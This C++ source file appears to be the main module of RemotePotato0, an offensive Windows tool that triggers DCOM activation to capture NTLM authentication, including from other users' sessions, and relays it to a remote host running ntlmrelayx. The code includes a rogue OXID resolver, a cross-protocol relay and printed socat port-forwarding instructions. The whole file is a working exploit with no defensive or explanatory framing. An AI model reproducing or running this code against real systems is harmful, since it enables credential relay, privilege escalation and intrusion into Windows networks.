#include "Windows.h"
#include "stdio.h"
#include "HTTPCrossProtocolRelay.h"
#include "RogueOxidResolver.h"
#include "IStorageTrigger.h"
#include "RogueOxidResolver_h.h"
#include "IStandardActivator_h.h"
#include <system_error>
#include <versionhelpers.h>

int g_sessionID=-1;
wchar_t* g_rpc2httpCrossProtocolRelayPort;
wchar_t* rogueOxidResolverIp;
wchar_t* rogueOxidResolverPort;
bool juicyPotatoCompatible;

BOOL g_SuccessTrigger = FALSE;

DWORD WINAPI ThreadRogueOxidResolver(LPVOID lpParam);
DWORD WINAPI ThreadHTTPCrossProtocolRelay(LPVOID lpParam);
void TriggerDCOM(wchar_t*);
void TriggerDCOMWithSessionID(wchar_t*);
void usage();
BOOL IsJuicyPotatoCompatible();

typedef NTSTATUS(NTAPI* pRtlGetVersion)(OSVERSIONINFOEX* lpVersionInformation);

struct THREAD_PARAMETERS
{
	wchar_t* remoteIpRelay;
	wchar_t* remotePortRelay;
	wchar_t* rogueOxidResolverIp;
	wchar_t* hTTPCrossProtocolRelayPort;
	wchar_t* rogueOxidResolverPort;
};


int wmain(int argc, wchar_t** argv)
{
	int cnt = 1;
	wchar_t defaultRemotePortRelay[] = L"80";
	wchar_t defaultRogueOxidResolverIp[] = L"127.0.0.1";
	wchar_t defaultHTTPCrossProtocolrelayPort[] = L"9997";
	wchar_t defaultClsid[] = L"{5167B42F-C111-47A1-ACC4-8EABE61B0B54}";
	wchar_t* remoteIpRelay = NULL;
	wchar_t* remotePortRelay = defaultRemotePortRelay;
	wchar_t* httpCrossProtocolrelayPort = defaultHTTPCrossProtocolrelayPort;
	wchar_t* clsid = defaultClsid;
	rogueOxidResolverIp = defaultRogueOxidResolverIp;

	while ((argc > 1) && (argv[cnt][0] == '-'))
	{

		switch (argv[cnt][1])
		{

		case 's':
			++cnt;
			--argc;
			g_sessionID = _wtoi(argv[cnt]);
			break;

		case 'c':
			++cnt;
			--argc;
			clsid = argv[cnt];
			break;

		case 'l':
			++cnt;
			--argc;
			httpCrossProtocolrelayPort = argv[cnt];
			break;

		case 'm':
			++cnt;
			--argc;
			remotePortRelay = argv[cnt];
			break;

		case 'p':
			++cnt;
			--argc;
			rogueOxidResolverPort = argv[cnt];
			break;

		case 'k':
			++cnt;
			--argc;
			rogueOxidResolverIp = argv[cnt];
			break;

		case 'r':
			++cnt;
			--argc;
			remoteIpRelay = argv[cnt];
			break;

		case 'h':
			usage();
			exit(0);

		default:
			printf("Wrong Argument: %S\n", argv[cnt]);
			usage();
			exit(-1);
		}
		++cnt;
		--argc;
	}

	if (rogueOxidResolverPort == NULL || remoteIpRelay == NULL)
	{
		usage();
		exit(-1);
	}

	if (IsJuicyPotatoCompatible()) {
		printf("[*] Detected a Windows Server version compatible with JuicyPotato. RogueOxidResolver can be run locally on 127.0.0.1\n");
		juicyPotatoCompatible = true;
	}
	else
	{
		rogueOxidResolverIp = remoteIpRelay;
		printf("[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on %S to your victim machine on port %S\n", remoteIpRelay, rogueOxidResolverPort);
		printf("[*] Example Network redirector: \n\tsudo socat TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:%S\n", rogueOxidResolverPort);
		juicyPotatoCompatible = false;
	}

	g_rpc2httpCrossProtocolRelayPort = httpCrossProtocolrelayPort;
	printf("[*] Starting the NTLM relay attack, launch ntlmrelayx on %S!!\n", remoteIpRelay);
	CreateThread(NULL, 0, ThreadRogueOxidResolver, (LPVOID)rogueOxidResolverPort, 0, NULL);
	THREAD_PARAMETERS threads_params = {};
	threads_params.remoteIpRelay = remoteIpRelay;
	threads_params.remotePortRelay = remotePortRelay;
	threads_params.rogueOxidResolverIp = defaultRogueOxidResolverIp;
	threads_params.hTTPCrossProtocolRelayPort = httpCrossProtocolrelayPort;
	threads_params.rogueOxidResolverPort = rogueOxidResolverPort;

	HANDLE hThreadCrossProtocolRelay = CreateThread(NULL, 0, ThreadHTTPCrossProtocolRelay, (LPVOID)& threads_params, 0, NULL);
	if(g_sessionID == -1)
		TriggerDCOM(clsid);
	else
		TriggerDCOMWithSessionID(clsid);
	WaitForSingleObject(hThreadCrossProtocolRelay, INFINITE);
	return 0;
}

DWORD WINAPI ThreadRogueOxidResolver(LPVOID lpParam)
{
	size_t pReturnValue;
	char listening_port[6];
	wcstombs_s(&pReturnValue, listening_port, 5, (const wchar_t*)lpParam, 5);
	RunRogueOxidResolver(listening_port);
	return 0;
}

DWORD WINAPI ThreadHTTPCrossProtocolRelay(LPVOID lpParam) {
	THREAD_PARAMETERS* thread_params = (THREAD_PARAMETERS*)lpParam;
	DoHTTPCrossProtocolRelay(thread_params->remoteIpRelay, thread_params->remotePortRelay, thread_params->rogueOxidResolverIp, thread_params->rogueOxidResolverPort, thread_params->hTTPCrossProtocolRelayPort);
	return 0;
}
void TriggerDCOM(wchar_t* clsid_string)
{
	CoInitialize(NULL);

	//Create IStorage object
	IStorage* stg = NULL;
	ILockBytes* lb = NULL;
	HRESULT res;

	res = CreateILockBytesOnHGlobal(NULL, TRUE, &lb);
	res = StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	//Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	CLSID clsid;
	CLSIDFromString(clsid_string, &clsid);
	CLSID tmp;
	//IUnknown IID
	CLSIDFromString(OLESTR("{00000000-0000-0000-C000-000000000046}"), &tmp);
	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;

	//Call CoGetInstanceFromIStorage
	printf("[*] Calling CoGetInstanceFromIStorage with CLSID:%S\n", clsid_string);
	HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);
	if (!g_SuccessTrigger)
	{
		if (status == CO_E_BAD_PATH)
			printf("[!] Error. CLSID %S not found. Bad path to object.\n", clsid_string);
		else
			printf("[!] Error. Trigger DCOM failed with status: 0x%x\n", status);
		exit(-1);
	}
	//debug
	//printf("[*] CoGetInstanceFromIStorage status:0x%x\n", status);
	CoUninitialize();
}

void TriggerDCOMWithSessionID(wchar_t* clsid_string)
{
	CoInitialize(NULL);

	//Create IStorage object
	IStorage* stg = NULL;
	ILockBytes* lb = NULL;
	HRESULT res;

	res = CreateILockBytesOnHGlobal(NULL, TRUE, &lb);
	res = StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	//Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	CLSID clsid;
	CLSIDFromString(clsid_string, &clsid);
	CLSID tmp, CLSID_ComActivator;
	//IUnknown IID
	CLSIDFromString(OLESTR("{00000000-0000-0000-C000-000000000046}"), &tmp);
	//ComActivator CLSID
	CLSIDFromString(OLESTR("{0000033C-0000-0000-c000-000000000046}"), &CLSID_ComActivator);

	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;
	IStandardActivator* pComAct;
	HRESULT r = CoCreateInstance(CLSID_ComActivator, NULL, CLSCTX_INPROC_SERVER, IID_IStandardActivator, (LPVOID*)&pComAct);
	//printf("CoCreate=%d\n", r);
	ISpecialSystemProperties* pSpecialProperties = NULL;
	//printf("start query inter\n");
	r = pComAct->QueryInterface(IID_ISpecialSystemProperties, (void**)& pSpecialProperties);
	//printf("query inter: %d\n", r);
	//printf("start set session");
	r = pSpecialProperties->SetSessionId(g_sessionID, 0, 1);
	//printf("set session: %d\n", r);
	printf("[*] Spawning COM object in the session: %d\n", g_sessionID);
	printf("[*] Calling StandardGetInstanceFromIStorage with CLSID:%S\n", clsid_string);
	HRESULT status = pComAct->StandardGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);
	std::string message = std::system_category().message(status);
	//printf("Error: %s\n", message.c_str());
	//Call CoGetInstanceFromIStorage
	//printf("[*] Calling CoGetInstanceFromIStorage with CLSID:%S\n", clsid_string);
	//HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);
	if (!g_SuccessTrigger)
	{
		if (status == CO_E_BAD_PATH)
			printf("[!] Error. CLSID %S not found. Bad path to object.\n", clsid_string);
		else
			printf("[!] Error. Trigger DCOM failed with status: 0x%x\n", status);
		exit(-1);
	}
	//debug
	//printf("[*] CoGetInstanceFromIStorage status:0x%x\n", status);
	CoUninitialize();
}

BOOL IsJuicyPotatoCompatible() {
	OSVERSIONINFOEX Version;
	memset(&Version, 0x00, sizeof(Version));
	Version.dwOSVersionInfoSize = sizeof(Version);
	pRtlGetVersion RtlGetVersion = (pRtlGetVersion)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
	RtlGetVersion(&Version);
	if (Version.dwMajorVersion <= 10 && Version.dwBuildNumber <= 17134)
		return true;
	return false;
}

void usage()
{
	printf("\n\n\tRemotePotato0\n\t@splinter_code & @decoder_it\n\n\n\n");
	printf("Mandatory args: \n"
		"-r remote relay host\n"
		"-p Rogue Oxid Resolver port\n"
	);
	printf("\n\n");
	printf("Optional args: \n"
		"-s Cross session activation (default disabled)\n"
		"-l local listener port (Default 9997)\n"
		"-m remote relay port (Default 80)\n"
		"-c clsid (Default {5167B42F-C111-47A1-ACC4-8EABE61B0B54})\n"
	);
}